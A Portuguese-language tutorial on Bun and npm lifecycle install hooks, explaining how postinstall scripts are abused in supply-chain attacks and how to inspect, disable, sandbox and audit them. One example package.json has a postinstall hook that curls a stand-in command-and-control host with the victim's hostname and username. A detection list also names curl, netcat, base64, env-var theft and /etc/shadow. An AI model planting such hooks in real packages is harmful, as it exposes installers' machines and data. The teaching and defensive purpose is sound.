# Hooks — Lifecycle Scripts de Instalacao

> Como scripts de pre/pos-instalacao funcionam e por que sao o vetor mais explorado.

---

## Intuition (Feynman)

Lifecycle hooks sao como gatilhos automaticos: quando voce instala um pacote, ele pode dizer "antes de me instalar, execute esse script" (preinstall) ou "depois de me instalar, execute esse outro" (postinstall). E exatamente o que ferramentas de build usam para compilar codigo nativo.

E exatamente o que atacantes usam para executar codigo malicioso quando voce faz `bun add malware`.

---

## Source Code

No repositorio `oven-sh/bun`:
```
src/
├── install/
│   ├── lifecycle.zig    # Execucao de lifecycle scripts
│   └── install.zig      # Quando e como executar hooks
└── ...
```

---

## Hands-On Analysis

### 1. Hooks Disponiveis

```json
// package.json — hooks em ordem de execucao
{
  "scripts": {
    "preinstall":   "echo 'Executado ANTES de instalar dependencias'",
    "install":      "echo 'Executado durante instalacao'",
    "postinstall":  "echo 'Executado APOS instalar dependencias'",
    "preuninstall": "echo 'Executado ANTES de desinstalar'",
    "uninstall":    "echo 'Executado durante desinstalacao'",
    "postuninstall":"echo 'Executado APOS desinstalar'",
    "preprepare":   "echo 'ANTES do prepare'",
    "prepare":      "echo 'Rodado por npm install e npm pack'",
    "postprepare":  "echo 'APOS o prepare'",
    "prepack":      "echo 'ANTES de criar o tarball'",
    "postpack":     "echo 'APOS criar o tarball'"
  }
}
```

### 2. Inspecionar Hooks Instalados

```bash
# Ver todos os scripts de hooks nos pacotes instalados
cat > /tmp/find_hooks.sh << 'EOF'
#!/bin/bash
echo "=== Lifecycle Hooks em node_modules ==="
HOOKS=("preinstall" "postinstall" "install" "prepare" "prepack")

for pkg_dir in node_modules/*/; do
    pkg=$(basename "$pkg_dir")
    pkg_json="$pkg_dir/package.json"
    [ -f "$pkg_json" ] || continue

    for hook in "${HOOKS[@]}"; do
        script=$(python3 -c "
import json,sys
try:
    d=json.load(open('$pkg_json'))
    s=d.get('scripts',{})
    print(s.get('$hook',''))
except:
    pass
" 2>/dev/null)

        if [ -n "$script" ]; then
            echo ""
            echo "[$pkg] $hook:"
            echo "  $script" | head -3
        fi
    done
done
EOF
bash /tmp/find_hooks.sh 2>/dev/null | head -40
```

### 3. Desabilitar Hooks

```bash
# Instalar SEM executar scripts (mais seguro)
bun install --ignore-scripts

# Para npm/npx:
npm install --ignore-scripts

# Configurar globalmente em .npmrc:
echo "ignore-scripts=true" >> ~/.npmrc
```

---

## Security Analysis

### Anatomia de um Ataque via postinstall

```bash
# Como um pacote malicioso ataca via hooks:

cat > /tmp/evil-pkg/package.json << 'EOF'
{
  "name": "useful-colors",
  "version": "9999.9999.9999",
  "description": "A popular color library",
  "scripts": {
    "postinstall": "node -e \"const {execSync}=require('child_process');try{execSync('curl -s http://c2.evil.com/$(hostname)/$(whoami)',{timeout:3000})}catch(e){}\""
  }
}
EOF

# A vítima faz:
# bun add useful-colors
# E o payload e executado automaticamente
```

### Exemplos Reais de Abuso

```bash
# 2022: colors e faker envenenados pelo proprio autor
# 2021: ua-parser-js com minerador de criptomoeda
# 2020: event-stream com backdoor bancario

# Verificar se pacotes instalados tem historico de incidentes
# (usando npm advisory database)
npm audit --json 2>/dev/null | python3 -c "
import json,sys
data = json.load(sys.stdin)
vulns = data.get('vulnerabilities', {})
for name, info in list(vulns.items())[:10]:
    print(f'{name}: {info.get(\"severity\", \"?\")} - {info.get(\"title\", \"?\")}')
" 2>/dev/null | head -10
```

### Deteccao de Hooks Maliciosos

```bash
# Patterns que indicam scripts de hook maliciosos
DANGEROUS_PATTERNS=(
    "curl\|wget"           # download de payload
    "exec\|spawn"          # execucao de comandos
    "nc\|netcat\|ncat"     # conexoes de rede
    "base64"               # payload ofuscado
    "eval"                 # execucao dinamica
    "process.env"          # roubo de env vars
    "fs.readFile\|readdir" # leitura de arquivos
    "/etc/passwd\|/etc/shadow" # arquivos sensiveis
)

for pattern in "${DANGEROUS_PATTERNS[@]}"; do
    echo "=== Buscando: $pattern ==="
    for pkg_json in node_modules/*/package.json; do
        script=$(cat "$pkg_json" | python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    s=d.get('scripts',{})
    print(' '.join(s.values()))
except:
    pass
" 2>/dev/null)
        if echo "$script" | grep -qE "$pattern"; then
            echo "  $(dirname $pkg_json | xargs basename)"
        fi
    done
done
```

---

## Exercises

### Ex P4.1 — Hook Monitor

```bash
# Monitorar execucao de hooks em tempo real
cat > /tmp/hook_monitor.sh << 'EOF'
#!/bin/bash
# Executa bun install e monitora processos filhos

echo "Iniciando monitoramento de processos..."

# Monitorar com strace
strace -f -e trace=execve bun install 2>&1 | \
    grep -E "execve" | \
    grep -v "bun\|ENOENT" | \
    head -20

echo "Instalacao completa"
EOF
bash /tmp/hook_monitor.sh
```

### Ex P4.2 — Sandbox para Hooks

```bash
# Executar instalacao em sandbox com restricoes

# Usando nsjail (se disponivel) ou firejail
if command -v firejail &>/dev/null; then
    firejail --net=none --noroot \
        bun install 2>&1 | head -20

elif command -v unshare &>/dev/null; then
    # Usar namespaces para isolamento
    unshare --net --fork \
        bun install 2>&1 | head -20

else
    echo "Execute em container isolado:"
    echo "docker run --rm -v \$(pwd):/app -w /app --network=none node bun install"
fi
```

### Ex P4.3 — Auditoria Pre-Instalacao

```typescript
// Script para auditar um pacote ANTES de instalar
async function auditPackage(name: string, version = "latest") {
    const registryUrl = `https://registry.npmjs.org/${name}/${version}`;
    const res = await fetch(registryUrl);

    if (!res.ok) {
        console.error(`Pacote nao encontrado: ${name}`);
        return;
    }

    const data = await res.json();

    // Verificar scripts
    const scripts = data.scripts ?? {};
    const dangerousHooks = ["preinstall", "postinstall", "install", "prepare"];

    console.log(`=== Auditoria: ${name}@${data.version} ===`);

    for (const hook of dangerousHooks) {
        if (scripts[hook]) {
            console.warn(`[WARN] Hook ${hook}:`);
            console.warn(`  ${scripts[hook]}`);
        }
    }

    // Verificar mantenedores
    console.log(`Mantenedores: ${data.maintainers?.map((m: any) => m.name).join(", ")}`);

    // Verificar data de publicacao
    const published = new Date(data.time?.created ?? 0);
    const age = (Date.now() - published.getTime()) / (1000 * 60 * 60 * 24);
    console.log(`Publicado ha: ${age.toFixed(0)} dias`);

    if (age < 7) {
        console.warn("[WARN] Pacote recente (menos de 7 dias)!");
    }
}

await auditPackage(Bun.argv[2] ?? "express");
```

---

## Checkpoint

[ ] Listou lifecycle hooks em todos os pacotes instalados
[ ] Instalou com `--ignore-scripts` e verificou diferenca
[ ] Identificou patterns perigosos em scripts de instalacao
[ ] Entende ataques reais via postinstall (ua-parser-js, colors)
[ ] Implementou auditoria pre-instalacao

---

## Next

→ [`../security/02-sandbox`](../../security/02-sandbox/) — modelo de sandbox do Bun
